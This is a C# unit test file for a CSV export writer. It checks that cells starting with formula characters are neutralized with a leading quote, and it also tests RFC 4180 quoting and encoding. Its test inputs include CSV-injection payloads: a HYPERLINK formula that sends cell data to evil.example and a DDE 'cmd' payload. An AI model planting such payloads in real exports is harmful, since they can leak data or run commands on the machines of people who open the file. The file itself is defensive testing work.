using System.Text;
using AssetTracker.Core.Reporting;

namespace AssetTracker.Tests.Reporting;

public class CsvWriterTests
{
    [Theory]
    [InlineData("=HYPERLINK(\"http://evil.example/?x=\"&A1,\"click\")")]
    [InlineData("+cmd|' /C calc'!A0")]
    [InlineData("@SUM(1)")]
    [InlineData("-2+3")]
    [InlineData("=cmd")]
    [InlineData("  =cmd")]
    [InlineData("\t=1+1")]
    [InlineData("\r=1+1")]
    [InlineData("＝1+1")] // fullwidth =
    [InlineData("＋1")]   // fullwidth +
    [InlineData("－1")]   // fullwidth -
    [InlineData("＠SUM(1)")] // fullwidth @
    public void Formula_triggers_are_prefixed_with_a_single_quote(string payload)
    {
        var csv = new CsvWriter().Text(payload).EndRow().ToString();

        var cell = CsvTestParser.Parse(csv).Single().Single();
        Assert.Equal("'" + payload, cell);
    }

    [Theory]
    [InlineData("Laptop 14\"")]
    [InlineData("A. Example")]
    [InlineData("2026-03-02")]
    [InlineData(" =not-first")]
    [InlineData("")]
    public void Safe_text_is_not_prefixed(string value)
    {
        var cell = CsvTestParser.Parse(new CsvWriter().Text(value).EndRow().ToString()).Single().Single();
        Assert.Equal(value, cell);
    }

    [Fact]
    public void Quotes_commas_and_newlines_are_quoted_per_rfc4180()
    {
        var csv = new CsvWriter().Text("say \"hi\"").Text("a,b").Text("line1\nline2").Text("cr\rlf").Text("plain")
            .EndRow().ToString();

        Assert.Equal("\"say \"\"hi\"\"\",\"a,b\",\"line1\nline2\",\"cr\rlf\",plain\r\n", csv);
        Assert.Equal(["say \"hi\"", "a,b", "line1\nline2", "cr\rlf", "plain"], CsvTestParser.Parse(csv).Single());
    }

    [Fact]
    public void Neutralized_cell_with_embedded_quotes_and_newline_round_trips()
    {
        var payload = "=HYPERLINK(\"x\")\r\n,next";
        var cell = CsvTestParser.Parse(new CsvWriter().Text(payload).EndRow().ToString()).Single().Single();
        Assert.Equal("'" + payload, cell);
    }

    [Fact]
    public void Typed_numbers_dates_and_nulls_bypass_neutralization()
    {
        var csv = new CsvWriter().Number(-5).Number(42L).Number((long?)null).Date(new DateOnly(2026, 3, 2))
            .Timestamp(new DateTimeOffset(2026, 3, 2, 9, 5, 0, TimeSpan.FromHours(1))).Bool(true).Text(null)
            .EndRow().ToString();

        Assert.Equal("-5,42,,2026-03-02,2026-03-02 08:05:00,Yes,\r\n", csv);
    }

    [Fact]
    public void Output_is_utf8_with_bom_and_crlf_rows()
    {
        var w = new CsvWriter().Header("Name", "Qty").Text("Zoë").Number(1).EndRow();
        var bytes = w.ToUtf8Bytes();

        Assert.Equal(new byte[] { 0xEF, 0xBB, 0xBF }, bytes[..3]);
        Assert.Equal("Name,Qty\r\nZoë,1\r\n", Encoding.UTF8.GetString(bytes[3..]));
        Assert.Equal(2, w.RowCount);
    }
}

/// <summary>Minimal RFC 4180 parser for asserting exported content.</summary>
public static class CsvTestParser
{
    public static List<string[]> Parse(string text)
    {
        if (text.Length > 0 && text[0] == '﻿') text = text[1..];
        var rows = new List<string[]>();
        var row = new List<string>();
        var field = new StringBuilder();
        var inQuotes = false;
        for (var i = 0; i < text.Length; i++)
        {
            var c = text[i];
            if (inQuotes)
            {
                if (c == '"' && i + 1 < text.Length && text[i + 1] == '"') { field.Append('"'); i++; }
                else if (c == '"') inQuotes = false;
                else field.Append(c);
            }
            else if (c == '"') inQuotes = true;
            else if (c == ',') { row.Add(field.ToString()); field.Clear(); }
            else if (c == '\r' && i + 1 < text.Length && text[i + 1] == '\n')
            {
                row.Add(field.ToString()); field.Clear();
                rows.Add([.. row]); row.Clear();
                i++;
            }
            else field.Append(c);
        }
        if (field.Length > 0 || row.Count > 0) { row.Add(field.ToString()); rows.Add([.. row]); }
        return rows;
    }

    /// <summary>Rows as dictionaries keyed by the header row.</summary>
    public static List<Dictionary<string, string>> ParseWithHeader(string text)
    {
        var rows = Parse(text);
        var header = rows[0];
        return rows.Skip(1).Select(r => header.Select((h, i) => (h, v: r[i])).ToDictionary(x => x.h, x => x.v)).ToList();
    }
}
